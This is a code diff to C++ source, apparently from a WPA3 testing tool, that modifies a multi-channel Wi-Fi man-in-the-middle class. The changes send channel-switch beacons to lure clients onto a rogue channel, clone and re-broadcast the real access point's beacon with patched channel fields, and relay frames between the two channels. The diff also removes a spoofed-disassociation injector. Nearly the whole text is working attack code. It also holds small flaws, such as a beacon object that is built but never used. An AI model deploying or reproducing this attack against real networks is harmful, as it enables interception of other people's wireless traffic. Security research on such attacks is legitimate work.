@@ -37,16 +37,6 @@ namespace wpa3_tester{
         return (it != clients.end()) ? it->second.get() : nullptr;
     }
 
-    void McMitm::send_disas(const string& macaddr) const {
-        Dot11Disassoc pkt;
-        pkt.addr1(HWAddress<6>(macaddr));
-        pkt.addr2(HWAddress<6>(ap_mac));
-        pkt.addr3(HWAddress<6>(ap_mac));
-        pkt.reason_code(0);
-        sender_rogue->send(pkt, nic_real_ap);
-        log(LogLevel::INFO, "Rogue channel: injected Disassociation to " + macaddr);
-    }
-
     static uint16_t get_seq_num(const Dot11& pkt) {
         if (const auto* mgmt = pkt.find_pdu<Dot11ManagementFrame>())
             return mgmt->seq_num();
@@ -55,9 +45,20 @@ namespace wpa3_tester{
         return 0;
     }
 
-    void McMitm::run(const int timeout_sec) {
-        probe_resp.reset(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
+    static void debug_send(PacketSender& sender, RawPDU& pdu, const NetworkInterface& iface, const string& tag) {
+        try {
+            const auto& payload = pdu.payload();
+            RadioTap rt(payload.data(), payload.size());
+            const auto* dot11 = rt.find_pdu<Dot11>();
+            if (dot11 && dot11->subtype() == Dot11::BEACON) {
+                const auto* mgmt = rt.find_pdu<Dot11ManagementFrame>();
+                const bool has_csa = mgmt && mgmt->search_option(Dot11::CHANNEL_SWITCH);
+                log(LogLevel::DEBUG, "[%s] Sending BEACON on %s%s", tag.c_str(), iface.name().c_str(), has_csa ? " [CSA]" : "");
+            }
+        } catch (...) {}
+    }
 
+    void McMitm::run(const int timeout_sec) {
         if (!sniffer_real || !sniffer_rogue) {
             log(LogLevel::ERROR, "Sniffers not initialized before run()");
             return;
@@ -67,12 +68,45 @@ namespace wpa3_tester{
             return;
         }
 
+        probe_resp.reset(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
+
+        auto* b = new Dot11Beacon();
+        b->addr1(beacon->addr1());
+        b->addr2(beacon->addr2());
+        b->addr3(beacon->addr3());
+        b->timestamp(beacon->timestamp());
+        b->interval(beacon->interval());
+        b->capabilities() = beacon->capabilities();
+        b->ds_parameter_set(netconfig.rogue_channel);
+
+        for (const auto& opt : beacon->options()) {
+            if (opt.option() == Dot11::TIM) continue;
+            if (opt.option() == Dot11::DS_SET) continue;
+            if (opt.option() == Dot11::CHANNEL_SWITCH) throw runtime_error("Beacon contains CSA option");
+
+            if (opt.option() == Dot11::HT_OPERATION && opt.data_size() >= 1) {
+                vector ht_data(opt.data_ptr(), opt.data_ptr() + opt.data_size());
+                ht_data[0] = netconfig.rogue_channel;
+                b->add_option({Dot11::HT_OPERATION, ht_data.size(), ht_data.data()});
+                continue;
+            }
+            b->add_option(opt);
+        }
+
+        RadioTap rt;
+        rt.inner_pdu(*beacon);
+        auto rogue_beacon_raw = rt.serialize();
+        patch_channel_raw(rogue_beacon_raw, netconfig.rogue_channel);
+
         CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel, netconfig.rogue_channel, 1);
 
         last_real_beacon  = now_sec();
         last_rogue_beacon = now_sec();
         double next_beacon  = now_sec() + 0.01;
         const double deadline = (timeout_sec > 0) ? now_sec() + timeout_sec : -1.0;
+
+        pcap_setnonblock(sniffer_real->get_pcap_handle(), 1, nullptr);
+        pcap_setnonblock(sniffer_rogue->get_pcap_handle(), 1, nullptr);
 
         while (true) {
             if (deadline > 0 && now_sec() > deadline) {
@@ -91,7 +125,12 @@ namespace wpa3_tester{
             try_sniff(*sniffer_rogue, &McMitm::handle_rx_rogue_chan);
 
             if (next_beacon <= now_sec()) {
-                CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
+                //CSA_attack::send_CSA_beacon(ap_mac, nic_real_ap, ssid, netconfig.real_channel,  netconfig.rogue_channel, 1);
+
+                RawPDU raw_pdu(rogue_beacon_raw.data(), rogue_beacon_raw.size());
+                debug_send(*sender_rogue, raw_pdu, nic_rogue_ap, "rogue");
+                sender_rogue->send(raw_pdu, nic_rogue_ap);
+
                 next_beacon += 0.10;
             }
 
@@ -150,16 +189,13 @@ namespace wpa3_tester{
         const long   header_fixed    = old_rt_len + 24 + 12;
         vector new_raw(raw.begin(), raw.begin() + header_fixed);
 
-        //std::cerr << "old_rt_len=" << old_rt_len
-      //<< " rt_patched.size()=" << rt_patched.size() << std::endl;
-
         size_t pos = header_fixed; // Tag parsing
         while (pos + 2 <= effective_size) {
             const uint8_t id  = raw[pos];
             const uint8_t len = raw[pos + 1];
 
             if (pos + 2 + len > raw.size()) {
-                cerr << "ERR: Malformed IE at pos " << pos << " (ID: " << static_cast<int>(id) << ")" << endl;
+                //cerr << "ERR: Malformed IE at pos " << pos << " (ID: " << static_cast<int>(id) << ")" << endl;
                 break;
             }
             // Patching logic
@@ -183,8 +219,7 @@ namespace wpa3_tester{
 
         const string addr1 = dot11->addr1().to_string();
         string addr2;
-        const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>();
-        if (mgmt)
+        if (const auto* mgmt = pdu.find_pdu<Dot11ManagementFrame>())
             addr2 = mgmt->addr2().to_string();
         else if (const auto* data = pdu.find_pdu<Dot11Data>())
             addr2 = data->addr2().to_string();
@@ -200,38 +235,22 @@ namespace wpa3_tester{
             return; // don't forward client→AP frames from real channel, they belong on rogue
         }
 
-        if (dot11->subtype() == Dot11::BEACON) {
-            last_real_beacon = now_sec();
-            if (mgmt) {
-                for (const auto& opt : mgmt->options()) {
-                    log(LogLevel::DEBUG, "Beacon tag id=%d", opt.option());
-                }
-                if (mgmt->search_option(Dot11::CHANNEL_SWITCH)) {
-                    log(LogLevel::DEBUG, "Skipping CSA beacon");
-                    return;
-                }
-            }
-        }
-
         // Frames from real AP — forward to rogue channel with patched channel IE
         if (addr2 == ap_mac) {
             if (dot11->subtype() == Dot11::BEACON){
                 last_real_beacon = now_sec();
+                return;
             }
 
             // Serialize, patch raw bytes, resend
             auto raw = pdu.serialize();
-
-            const uint16_t rt_lend = raw[2] | (raw[3] << 8);
-            const RadioTap& rt_check = pdu.rfind_pdu<RadioTap>();
-            assert(rt_lend == rt_check.header_size());
-
             patch_channel_raw(raw, netconfig.rogue_channel);
 
             const uint16_t rt_len = *reinterpret_cast<const uint16_t*>(raw.data() + 2);
             RawPDU dot11_only(raw.data() + rt_len, raw.size() - rt_len);
 
             auto patched = RawPDU(raw.data(), raw.size());
+            debug_send(*sender_rogue, patched, nic_rogue_ap, "addr forward");
             sender_rogue->send(patched, nic_rogue_ap);
             //print_rx(LogLevel::INFO, "Real channel", *dot11, " -- MitM");
         }
@@ -263,6 +282,7 @@ namespace wpa3_tester{
                 try { // send to get auth
                     const auto raw = pdu.serialize();
                     RawPDU raw_pdu(raw.data(), raw.size());
+                    debug_send(*sender_rogue, raw_pdu, nic_rogue_ap, " probe response back");
                     sender_real->send(raw_pdu, nic_real_ap);
                 } catch (const socket_write_error& e) {
                     log(LogLevel::WARNING, "send failed (subtype=%d): %s", dot11->subtype(), e.what());
@@ -282,6 +302,7 @@ namespace wpa3_tester{
             try {
                 const auto raw = pdu.serialize();
                 RawPDU raw_pdu(raw.data(), raw.size());
+                debug_send(*sender_rogue, raw_pdu, nic_rogue_ap, "sta -> ap");
                 sender_real->send(raw_pdu, nic_real_ap);
             } catch (const socket_write_error& e) {
                 log(LogLevel::WARNING, "send failed (subtype=%d): %s", dot11->subtype(), e.what());
